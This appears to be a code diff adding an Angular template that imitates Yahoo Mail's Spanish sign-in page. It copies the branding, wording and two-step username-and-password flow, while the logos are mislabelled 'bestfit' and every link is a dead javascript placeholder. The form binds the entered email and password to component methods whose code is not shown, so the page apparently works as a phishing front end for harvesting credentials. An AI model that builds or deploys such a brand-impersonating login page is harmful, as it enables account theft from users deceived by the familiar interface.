@@ -1,0 +1,377 @@
+<style nonce="">
+  #mbr-css-check {
+    display: inline;
+  }
+</style>
+
+<div id="login-body" class="loginish puree-v2 grid" bis_skin_checked="1">
+  <div class="mbr-desktop-hd" bis_skin_checked="1">
+    <span class="column">
+      <a href="javascript:void(0)">
+        <img
+          src="/assets/img/bestfit_frontpage_2x.png"
+          class="logo"
+          width=""
+          height="36"
+        />
+        <img
+          src="/assets/img/bestfict_frontpage_2x.png"
+          class="dark-mode-logo logo"
+          width=""
+          height="36"
+        />
+      </a>
+    </span>
+    <span class="column help txt-align-right">
+      <a href="javascript:void(0)">Ayuda</a>
+    </span>
+  </div>
+  <div class="login-box-container" bis_skin_checked="1">
+    <div class="login-box right" bis_skin_checked="1">
+      <div class="mbr-login-hd txt-align-center" bis_skin_checked="1">
+        <img
+          src="/assets/img/bestfit_frontpage_2x.png"
+          alt="Yahoo"
+          class="logo yahoo-es-US"
+          width=""
+          height="27"
+        />
+        <img
+          src="/assets/img/bestfict_frontpage_2x.png"
+          alt="Yahoo"
+          class="dark-mode-logo logo yahoo-es-US"
+          width=""
+          height="27"
+        />
+      </div>
+
+      <div *ngIf="oneStep" class="challenge yid-challenge" bis_skin_checked="1">
+        <div class="challenge-header" bis_skin_checked="1"></div>
+        <div class="username-challenge" id="login-landing" bis_skin_checked="1">
+          <strong class="challenge-heading"
+            >Iniciar sesión en Yahoo&nbsp;Mail</strong
+          >
+          <span class="challenge-desc signin-sub-title"
+            >usando tu cuenta de&nbsp;Yahoo</span
+          >
+
+          <form id="login-username-form" method="post" class="pure-form">
+            <div
+              id="username-country-code-field"
+              class="username-country-code puree-country-inline-dropdown-disabled code-of-length-1"
+              bis_skin_checked="1"
+            >
+              <!-- <div
+                id="selected-country-code-cont"
+                class="puree-dropdown selected-country-code-cont ltr hide"
+                bis_skin_checked="1"
+              >
+                <div
+                  id="selected-country-code"
+                  class="selected-country-code"
+                  bis_skin_checked="1"
+                >
+                  +1
+                </div>
+                <span class="arrow"></span>
+              </div> -->
+
+              <div class="input-group" bis_skin_checked="1">
+                <!-- show-icon used para mostrar el icono -->
+                <input
+                  class="phone-no"
+                  type="text"
+                  name="username"
+                  id="login-username"
+                  value=""
+                  autocomplete="username"
+                  autocapitalize="none"
+                  autocorrect="off"
+                  autofocus="true"
+                  placeholder=" "
+                  [ngClass]="{ 'show-icon': userModel.email.length }"
+                  [(ngModel)]="userModel.email"
+                />
+                <div
+                  *ngIf="!userModel.email.length"
+                  class="input-field-icon hide"
+                  id="username-field-icon"
+                ></div>
+
+                <div
+                  *ngIf="userModel.email.length"
+                  class="input-field-icon email-icon"
+                  id="username-field-icon"
+                ></div>
+
+                <label for="login-username" id="login-label" class="login-label"
+                  >Nombre de usuario, correo electrónico o&nbsp;celular</label
+                >
+                <ul
+                  class="auto-fill-overlay hide"
+                  aria-live="polite"
+                  id="domain-auto-fill"
+                >
+                  <li data-fill="yahoo.com" tabindex="2">yahoo.com</li>
+                  <li data-fill="gmail.com" tabindex="3">gmail.com</li>
+                  <li data-fill="outlook.com" tabindex="4">outlook.com</li>
+                  <li data-fill="aol.com" tabindex="5">aol.com</li>
+                </ul>
+              </div>
+              <div class="hidden-input-container" bis_skin_checked="1">
+                <input
+                  name="passwd"
+                  class="pwd-field"
+                  type="password"
+                  tabindex="-1"
+                  aria-hidden="true"
+                  role="presentation"
+                  autocorrect="off"
+                  placeholder="Password"
+                />
+              </div>
+            </div>
+
+            <p
+              id="username-error"
+              class="error-msg"
+              [class.hide]="!hasError"
+              role="alert"
+            >
+              Lo sentimos, no reconocemos esta&nbsp;cuenta.
+            </p>
+
+            <div class="button-container" bis_skin_checked="1">
+              <!-- [class.active]="isLoading" -->
+              <input
+                id="login-signin"
+                type="submit"
+                name="signin"
+                class="pure-button puree-button-primary challenge-button active"
+                value="Siguiente"
+                (click)="next()"
+              />
+            </div>
+
+            <div class="helper-links-container" bis_skin_checked="1">
+              <div class="helper-item" bis_skin_checked="1">
+                <span class="stay-signed-in checkbox-container">
+                  <input
+                    id="persistent"
+                    name="persistent"
+                    value="y"
+                    type="checkbox"
+                    checked=""
+                  />
+                  <label for="persistent">Permanecer&nbsp;conectado</label>
+                </span>
+              </div>
+              <div class="helper-item arlink" bis_skin_checked="1">
+                <span class="help">
+                  <a
+                    href="javascript:void(0)"
+                    id="mbr-forgot-link"
+                    data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:forgot"
+                    data-rapid-tracking="true"
+                  >
+                    ¿Olvidaste tu nombre de&nbsp;usuario?
+                  </a>
+                </span>
+              </div>
+            </div>
+            <div class="bottom-links-container" bis_skin_checked="1">
+              <p class="sign-up-link">
+                <a
+                  href="javascript:void(0)"
+                  id="createacc"
+                  role="button"
+                  class="pure-button puree-button-secondary challenge-button"
+                  data-rapid-tracking="true"
+                  data-ylk="elm:link;elmt:secondary;slk:signup;mKey:signup"
+                >
+                  Crear una&nbsp;cuenta
+                </a>
+              </p>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <!--  twoStep -->
+      <div
+        *ngIf="twoStep"
+        class="challenge password-challenge"
+        bis_skin_checked="1"
+      >
+        <div class="challenge-header" bis_skin_checked="1">
+          <div class="yid" bis_skin_checked="1">{{ userModel.email }}</div>
+        </div>
+        <div id="password-challenge" class="primary" bis_skin_checked="1">
+          <strong class="challenge-heading">Introduce la contraseña</strong>
+          <span class="txt-align-center challenge-desc"
+            >para iniciar sesión</span
+          >
+          <form class="challenge-form">
+            <div
+              id="password-container"
+              class="input-group password-container blurred"
+              [class.error]="hasError"
+            >
+              <input
+                type="text"
+                id="login-passwd"
+                class="password"
+                name="password"
+                placeholder=" "
+                autofocus=""
+                autocomplete="off"
+                [ngClass]="{
+                  kbproject: userModel.password.length && !showPassword,
+                  'has-error': hasError
+                }"
+                [(ngModel)]="userModel.password"
+              />
+              <label
+                for="login-passwd"
+                id="password-label"
+                class="password-label"
+                >Contraseña</label
+              >
+              <div
+                class="caps-indicator hide"
+                id="caps-indicator"
+                title="El bloqueo de mayúsculas está&nbsp;activado"
+                bis_skin_checked="1"
+              ></div>
+              <button
+                type="button"
+                class="show-hide-toggle-button"
+                [ngClass]="{
+                  'show-pw': showPassword,
+                  'hide-pw': !showPassword
+                }"
+                id="password-toggle-button"
+                tabindex="-1"
+                (click)="showHidePassword()"
+              ></button>
+            </div>
+
+            <p class="error-msg" role="alert" *ngIf="hasError">
+              ¡Uy! Al parecer, se produjo un error. Inténtalo de nuevo
+              más&nbsp;tarde.
+            </p>
+
+            <div class="button-container" bis_skin_checked="1">
+              <button
+                type="submit"
+                id="login-signin"
+                class="pure-button puree-button-primary puree-spinner-button challenge-button"
+                [class.active]="isLoading"
+                name="verifyPassword"
+                value="Siguiente"
+                (click)="logIn()"
+              >
+                Siguiente
+              </button>
+            </div>
+            <div class="forgot-cont challenge-button-link" bis_skin_checked="1">
+              <input
+                type="submit"
+                class="pure-button puree-button-link challenge-button-link"
+                data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery"
+                data-rapid-tracking="true"
+                id="mbr-forgot-link"
+                name="skip"
+                value="¿Olvidaste tu contraseña?"
+              />
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    <div
+      id="login-box-ad-fallback"
+      class="login-box-ad-fallback"
+      bis_skin_checked="1"
+    >
+      <h1>
+        Yahoo te permite disfrutar con facilidad de las cosas que más te
+        importan en el&nbsp;mundo.
+      </h1>
+      <p>
+        Lo mejor en su clase: Yahoo Mail, noticias de último momento (locales,
+        nacionales y mundiales), finanzas, deportes, música, películas y mucho
+        más. Aprovecha al máximo la Web y disfruta más de tu&nbsp;vida.
+      </p>
+    </div>
+  </div>
+  <div class="login-bg-outer" bis_skin_checked="1">
+    <div class="login-bg-inner" bis_skin_checked="1">
+      <div
+        id="sb_rel_login-ad-rich"
+        class="darla"
+        bis_skin_checked="1"
+        style="
+          position: relative;
+          z-index: 9;
+          width: 1440px;
+          height: 1024px;
+          visibility: inherit;
+          display: inline-block;
+          font-size: 0px;
+        "
+      >
+        <!-- KoBY -->
+        <iframe
+          style="
+            position: absolute;
+            z-index: 10;
+            width: 1440px;
+            height: 1024px;
+            top: 0px;
+            left: 0px;
+            visibility: inherit;
+            display: block;
+          "
+          id="login-ad-rich"
+          [src]="contentIframe"
+          async=""
+          allow="autoplay;vr;microphone https://s.yimg.com https://cdn.flashtalking.com https://cdn.cmp.advertising.com https://cdn.yahoomedia.net https://ads.pictela.net"
+          sandbox="allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox"
+          frameborder="no"
+          scrolling="no"
+          allowtransparency="true"
+          hidefocus="true"
+          tabindex="-1"
+          marginwidth="0"
+          marginheight="0"
+          bis_size='{"x":-65,"y":84,"w":1440,"h":1024,"abs_x":-65,"abs_y":84}'
+          bis_id="fr_uhim6feb92floedur9duri"
+          bis_depth="0"
+          bis_chainid="1"
+        ></iframe>
+      </div>
+    </div>
+  </div>
+  <div class="login-footer" bis_skin_checked="1">
+    <p>
+      <a href="javascript:void(0)" target="_blank" class="terms">Condiciones</a>
+
+      <span>|</span>
+      <a href="javascript:void(0)" target="_blank" class="privacy"
+        >Privacidad</a
+      >
+    </p>
+  </div>
+</div>
+
+<div id="mbr-css-check" bis_skin_checked="1"></div>
+<div id="page-mask" class="page-mask hide" bis_skin_checked="1"></div>
+<div id="ad" bis_skin_checked="1"></div>
+
+<div
+  id="darla_csc_holder"
+  class="darla"
+  bis_skin_checked="1"
+  style="display: none"
+></div>
